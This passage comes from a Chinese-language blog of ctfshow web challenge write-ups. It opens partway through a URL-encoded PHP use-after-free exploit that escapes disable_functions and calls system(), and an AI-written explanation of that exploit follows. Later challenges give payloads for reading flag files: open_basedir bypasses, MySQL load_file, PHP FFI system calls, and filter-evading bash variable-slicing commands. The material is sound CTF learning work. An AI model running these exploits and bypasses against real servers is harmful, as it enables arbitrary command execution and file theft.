B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E%0A<br></code></pre></td></tr></table></figure><p><code>uaf</code> 漏洞全称为 <code>user after free</code>，原理是当一个已经释放的内存块被重新分配并再次使用时，攻击者可能利用该内存块中的残留数据来执行任意代码，属于堆的知识点</p><p>deepseek 老师详解：</p><p>这个PHP脚本利用PHP中的UAF（Use After Free）漏洞，通过精心构造的内存操作和闭包对象篡改，实现任意命令执行。以下是对代码的详细分析：</p><p>漏洞触发与利用流程</p><ol><li>UAF 触发与内存泄漏<ul><li><strong>Vuln 类析构</strong>：<code>trigger_uaf</code> 函数创建 <code>Vuln</code> 对象，其析构函数通过 <code>debug_backtrace</code> 捕获堆栈信息，将释放后的字符串引用存入 <code>$abc</code>。</li><li><strong>堆布局</strong>：预先分配多个长字符串（<code>$contiguous</code>）来稳定堆布局，确保 <code>$abc</code> 指向释放后的内存区域。</li></ul></li><li>内存操作基础函数<ul><li><strong>地址转换</strong>：<code>str2ptr</code> 和 <code>ptr2str</code> 用于字符串与指针的转换，<code>write</code> 函数允许在字符串中任意位置写入数据。</li><li><strong>内存泄漏</strong>：<code>leak </code>函数通过修改字符串内部指针，读取任意地址内存值。</li></ul></li><li>ELF 解析与基址定位<ul><li><strong>ELF 头识别</strong>：<code>get_binary_base</code> 通过特征值 <code>0x7f454c460101</code>（ELF魔数）定位 PHP 二进制基址。</li><li><strong>程序头解析</strong>：<code>parse_elf</code> 分析 ELF 结构，获取数据段和代码段信息，为后续符号查找奠定基础。</li></ul></li><li>关键函数定位<ul><li><strong>基础函数表</strong>：<code>get_basic_funcs</code> 遍历内存，匹配 <code>zend_function_entry</code> 结构，定位 PHP 内部函数表。</li><li><strong>system 函数定位</strong>：<code>get_system</code> 遍历函数表，通过名称哈希（’system’对应<code>0x6d6574737973</code>）找到 <code>system</code> 函数地址。</li></ul></li><li>闭包对象篡改<ul><li><strong>结构复制</strong>：将原闭包对象数据复制到伪造对象中，维持结构合法性。</li><li><strong>函数指针劫持</strong>：修改闭包处理函数为 <code>system</code>，使得调用闭包时执行任意命令。</li></ul></li><li>命令执行<ul><li><strong>最终触发</strong>：通过 <code>($helper-&gt;b)($cmd)</code> 调用被篡改的闭包，触发 <code>system($cmd)</code> 执行系统命令。</li></ul></li></ol><p>关键代码解析</p><ul><li><p><strong>UAF利用点</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br><span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>; <span class="hljs-comment">// 分配字符串</span><br><span class="hljs-comment">// 对象销毁后，$abc仍引用已释放内存</span><br></code></pre></td></tr></table></figure></li><li><p><strong>闭包对象劫持</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment">// 替换处理函数为system</span><br></code></pre></td></tr></table></figure></li><li><p><strong>内存泄漏与计算</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 获取闭包处理程序地址</span><br><span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// 泄漏二进制地址</span><br></code></pre></td></tr></table></figure></li></ul><p>这个题对我来说有点难理解…</p><h1 id="Web-73"><a href="#Web-73" class="headerlink" title="Web 73"></a>Web 73</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: error_reporting() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">14</span><br><br><span class="hljs-built_in">Warning</span>: ini_set() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">15</span><br><br><span class="hljs-built_in">Warning</span>: highlight_file() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>可以直接包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&#x27;glob:///*&#x27;));die();<br>c=include(&#x27;/flagc.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web-74"><a href="#Web-74" class="headerlink" title="Web 74"></a>Web 74</h1><p>用之前的 payload 发现 <code>scandir()</code> 被 ban 了</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-literal">Warning</span>: scandir() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>换成 <code>DirectoryIterator</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=$a = new DirectoryIterator(&quot;glob:///*&quot;);<br>foreach($a as $f)&#123;<br>    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);<br>&#125;;exit();<br></code></pre></td></tr></table></figure><p>绕过姿势还是在这篇文章有讲解 <a href="https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/">open_basedir绕过</a></p><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flagx.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web-75"><a href="#Web-75" class="headerlink" title="Web 75"></a>Web 75</h1><p>同样用 payload 能读到有 <code>flag36.txt</code>，但是访问失败有限制，有 mysql，利用 mysql 绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<br><span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=127.0.0.1;dbname=mysql&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;);&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br><span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-variable">$row</span>);<br>&#125;<br><span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><h1 id="Web-76"><a href="#Web-76" class="headerlink" title="Web 76"></a>Web 76</h1><p>和 Web 75 一样的方法</p><h1 id="Web-77"><a href="#Web-77" class="headerlink" title="Web 77"></a>Web 77</h1><p>列出文件还是能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=$a = new DirectoryIterator(&quot;glob:///*&quot;);<br>foreach($a as $f)&#123;<br>    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);<br>&#125;;exit();<br></code></pre></td></tr></table></figure><p>hint 说是 php7.4 的 [FFI]( <a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a> <a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a>)</p><p>这个 <code>FFI</code> 是外部函数接口，能在 php 中去调用 C 语言的函数</p><p>绕过姿势：<a href="https://xz.aliyun.com/news/9507">bypass disable_functions姿势总结</a> 的利用 PHP7.4 FFI 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=<br>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);<br>$ffi-&gt;system(&quot;/readflag /flag36x.txt &gt; /var/www/html/flagxx.txt&quot;);   <br>exit();<br></code></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">url/flagxx.txt<br></code></pre></td></tr></table></figure><h1 id="Web-118"><a href="#Web-118" class="headerlink" title="Web 118"></a>Web 118</h1><p>只有一个输入框，f12 发现有一句 <code>&lt;!-- system($code);--&gt;</code> 也就是说输入的内容会被 <code>system()</code> 函数执行，而且只剩下 <code>$</code>、<code>&#123;</code>、<code>&#125;</code>、<code>?</code> 、<code>.</code> 、<code>~</code> 等等字符和大写字母没有被 ban</p><p>可以用这些字符构建命令：<a href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_path">常见 Bash 内置变量介绍</a></p><p>比如 <code>$PATH</code>、<code>$PWD</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/c0b74c7d52bfc6f9.png"></p><p>上面的 <code>$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</code> 输出了 <code>ls</code> ，这是因为 Linux 中的切片，在 Linux 中，<code>$&#123;var:offset:length&#125;</code> 为字符串切片形式，如上所示。当 <code>length</code> 为负数时，从尾部开始输出。</p><p><code>$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</code> 就是利用的 <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code> 中第 6 位( offset +1)字符  <code>l</code>  和第 12 位字符  <code>s</code>，组合输出了 <code>ls</code>，因此我们可以构造想要的命令输出。</p><p>但是数字被 ban 了，无法知道某个字符位置，这时候就能想到  Shell 语言中的 <code>$(())</code>，它是等于 0 的，取反后为 -1，但是 <code>()</code> 也被 ban了，没事，可以用 <code>$&#123;&#125;</code> </p><p>对一个空变量取反可以拿到一样的效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# <span class="hljs-built_in">echo</span> $((N))<br>0<br><br>┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# <span class="hljs-built_in">echo</span> $((~N))<br>-1<br></code></pre></td></tr></table></figure><p>所以，我们可以构造一个<code>nl</code> 列出 flag 内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;PATH:~N&#125;</span><br>n<br></code></pre></td></tr></table></figure><p>然后在 <code>/var/www/html</code> 目录下可以拿到 <code>l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿butt3rf1y)-[/var/www/html]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;PWD:~N&#125;</span><br>l<br></code></pre></td></tr></table></figure><p>而我们的 flag 直接用通配符</p><p>综上所述，payload 为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PATH:~N&#125;<span class="hljs-variable">$&#123;PWD:~N&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><p>查看源代码找到 flag</p><h1 id="Web-119"><a href="#Web-119" class="headerlink" title="Web 119"></a>Web 119</h1><h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p>用上一个 payload 已经不行了，<code>PATH</code> 被禁了，那么用 <code>PWD</code> 去构造，用 <code>whereis</code> 命令可以找到 <code>nl</code> 指令路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# whereis <span class="hljs-built_in">nl</span><br><span class="hljs-built_in">nl</span>: /usr/bin/nl<br></code></pre></td></tr></table></figure><p>因为 <code>PATH</code> 不能用，那就用通配符 <code>?</code>，<code>nl</code> 就可以表示为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?$&#123;PWD:~N&#125;<br></code></pre></td></tr></table></figure><p>需要带上路径 <code>/usr/bin/</code>，但是 <code>/</code> 和小写字母也被 ban 了，还是可以用 <code>?</code> 代替</p><p>而输出 <code>$PWD</code> 就能知道第一位就是 <code>/</code>，所以我们可以截取出来，当我们用 <code>set</code> 查看环境变量的时候会发现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SHLVL=1<br></code></pre></td></tr></table></figure><p>因此我们可以输出 <code>SHLVL</code> 来表示 1</p><p>在 Linux 中，<code>$&#123;&#125;</code> 中变量前加 <code>#</code> 可以获取字符串长度，那么就能表示为如下形式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;#SHLVL&#125;</span><br></code></pre></td></tr></table></figure><p>因此构造出形如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>?<span class="hljs-variable">$&#123;PWD:~N&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><p>这个 payload 为 :<code>/usr/bin/nl flag.xxx</code> 形式，因为 数字被 ban 了，所以 <code>$&#123;var:offset:length&#125;</code> 就可以简写成 <code>$&#123;var::length&#125;</code> 表示从 0 开始</p><p><code>SHLVL</code> 是记录多个 Bash 进程实例嵌套深度的累加器，比如说第一次打开 shell 时 <code>$SHLVL=1</code> ,然后在此 shell 中再打开一个 shell 时 <code>$SHLVL=2</code>，其实就是套娃的数量</p><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>相同的步骤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/cat<br></code></pre></td></tr></table></figure><p>构造出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PWD:<span class="hljs-variable">$&#123;#&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="hljs-variable">$&#123;PWD:<span class="hljs-variable">$&#123;#&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>??<span class="hljs-variable">$&#123;HOME:<span class="hljs-variable">$&#123;#HOSTNAME&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><h1 id="Web-120"><a href="#Web-120" class="headerlink" title="Web 120"></a>Web 120</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>终于有源码了TVT</p><p>因为有了长度限制为 65，之前的超出限制了，把 <code>SHLVL</code> 换成变量 